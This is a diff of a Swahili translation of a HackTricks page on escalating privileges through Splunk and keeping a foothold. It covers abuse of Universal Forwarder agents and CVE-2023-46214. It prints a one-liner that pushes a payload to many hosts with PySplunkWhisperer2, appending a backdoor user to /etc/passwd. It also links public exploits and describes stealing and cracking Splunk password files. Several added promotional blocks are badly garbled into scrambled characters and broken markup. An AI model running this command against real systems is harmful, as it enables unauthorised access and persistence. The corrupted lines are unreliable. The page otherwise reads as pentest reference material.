@@ -1,54 +1,58 @@
-# Splunk LPE na Uthabiti
+# Splunk LPE and Persistence
 
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<dotsilp>
 
-Njia nyingine za kusaidia HackTricks:
+<oummpr>SupportHackTricks</smmay>
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Ikiwa unafanya **uchunguzi** wa mashine **ndani** au **nje**, ukigundua **Splunk inayoendesha** (bandari 8090), ikiwa una bahati ya kujua **vitambulisho halali**, unaweza **kutumia huduma ya Splunk** ku **tekeleza kikao** kama mtumiaji anayeendesha Splunk. Ikiwa root inaendesha, unaweza kuongeza mamlaka hadi kufikia root.
+Ikiwa **unapofanya hesabu** ya mashine **ndani** au **nje** unakuta **Splunk inafanya kazi** (bandari 8090), ikiwa kwa bahati unajua **akili halali** unaweza **kutumia huduma ya Splunk** ili **kufanya shell** kama mtumiaji anayekimbia Splunk. Ikiwa root inafanya kazi, unaweza kuongeza mamlaka hadi root.
 
-Pia, ikiwa tayari ni root na huduma ya Splunk haiisikilizi tu kwenye localhost, unaweza **kuiba** faili ya **nywila** kutoka kwa huduma ya Splunk na **kuvunja** nywila, au **kuongeza vitambulisho vipya** kwake. Na kudumisha uthabiti kwenye mwenyeji.
+Pia ikiwa wewe ni **root tayari na huduma ya Splunk haisikii tu kwenye localhost**, unaweza **kuiba** faili ya **nenosiri** **kutoka** kwa huduma ya Splunk na **kufungua** nenosiri, au **kuongeza** akili mpya kwake. Na kudumisha uvumilivu kwenye mwenyeji.
 
 Katika picha ya kwanza hapa chini unaweza kuona jinsi ukurasa wa wavuti wa Splunkd unavyoonekana.
 
 
 
-## Muhtasari wa Kudukua Mawakala wa Splunk Universal Forwarder
+## Muhtasari wa Ulaghai wa Wakala wa Splunk Universal Forwarder
 
 Kwa maelezo zaidi angalia chapisho [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hii ni muhtasari tu:
 
-**Muhtasari wa Kudukua:**
-Kudukua mawakala wa Splunk Universal Forwarder (UF) inaruhusu wadukuzi wenye nenosiri la wakala kutekeleza nambari ya aina yoyote kwenye mifumo inayotumia wakala, na hivyo kuhatarisha mtandao mzima.
+**Muonekano wa Ulaghai:**
+Ulaghai unaolenga Wakala wa Splunk Universal Forwarder (UF) unaruhusu washambuliaji wenye nenosiri la wakala kutekeleza msimbo wowote kwenye mifumo inayokimbia wakala, ambayo inaweza kuhatarisha mtandao mzima.
 
 **Mambo Muhimu:**
-- Mawakala wa UF hawathibitishi ujio wa uhusiano au uhalali wa nambari, hivyo kuwa hatarini kwa utekelezaji usiohalali wa nambari.
-- Njia za kawaida za kupata nywila ni pamoja na kuzipata kwenye saraka za mtandao, kushiriki faili, au nyaraka za ndani.
-- Kudukua kwa mafanikio kunaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye mwenyeji uliodukuliwa, utoroshaji wa data, na uingizaji wa mtandao zaidi.
+- Wakala wa UF hauhakiki muunganisho unaokuja au uhalali wa msimbo, hivyo unafanya kuwa hatari kwa utekelezaji wa msimbo usioidhinishwa.
+- Njia za kawaida za kupata nenosiri ni pamoja na kuzitafuta katika saraka za mtandao, kushiriki faili, au nyaraka za ndani.
+- Ulaghai uliofanikiwa unaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye mwenyeji walioathirika, uhamasishaji wa data, na kuingia zaidi kwenye mtandao.
 
-**Utekelezaji wa Kudukua:**
-1. Mshambuliaji anapata nywila ya wakala wa UF.
-2. Anatumia API ya Splunk kutuma amri au hati kwa mawakala.
-3. Hatua zinazowezekana ni pamoja na kuchambua faili, kubadilisha akaunti za mtumiaji, na kudhoofisha mfumo.
+**Utekelezaji wa Ulaghai:**
+1. Mshambuliaji anapata nenosiri la wakala wa UF.
+2. Anatumia API ya Splunk kutuma amri au skripti kwa wakala.
+3. Vitendo vinavyowezekana ni pamoja na uchimbaji wa faili, usimamizi wa akaunti za mtumiaji, na kuathiri mfumo.
 
 **Athari:**
-- Kudukua mtandao mzima na ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
-- Uwezekano wa kuzima kumbukumbu ili kuepuka kugunduliwa.
-- Usanikishaji wa mlango wa nyuma au ransomware.
+- Kuathiri mtandao mzima kwa ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
+- Uwezekano wa kuzima uandishi wa kumbukumbu ili kuepuka kugunduliwa.
+- Usanidi wa milango ya nyuma au ransomware.
 
-**Amri ya Mfano kwa Kudukua:**
+**Amri ya Mfano kwa Ulaghai:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**Exploits za umma:**
+**Matumizi ya umma ya exploits:**
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
@@ -58,19 +62,23 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 
 **Kwa maelezo zaidi angalia chapisho [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
-**CVE-2023-46214** iliruhusu kupakia hati ya kiholela kwenye **`$SPLUNK_HOME/bin/scripts`** na kisha ilieleza kwamba kwa kutumia swali la utafutaji **`|runshellscript script_name.sh`** ilikuwa inawezekana **kutekeleza** **hati** iliyo stored hapo.
+{% h*nt styCe="Vacceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
+<dtil>
 
-<details>
+<ummr>SupportHackTricks</smmay>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
